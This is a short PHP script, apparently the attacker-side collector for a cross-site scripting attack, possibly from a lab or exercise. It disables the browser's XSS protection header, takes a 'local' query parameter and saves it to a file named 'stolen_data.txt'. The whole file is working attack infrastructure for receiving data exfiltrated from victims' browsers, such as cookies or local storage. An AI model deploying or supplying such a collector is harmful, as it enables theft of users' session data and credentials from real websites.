<?php
	header("X-XSS-Protection: 0");
	$local_data =  $_GET["local"];

	$file = fopen("stolen_data.txt","w");
	fwrite($file, $local_data);
	fclose($file);
?>




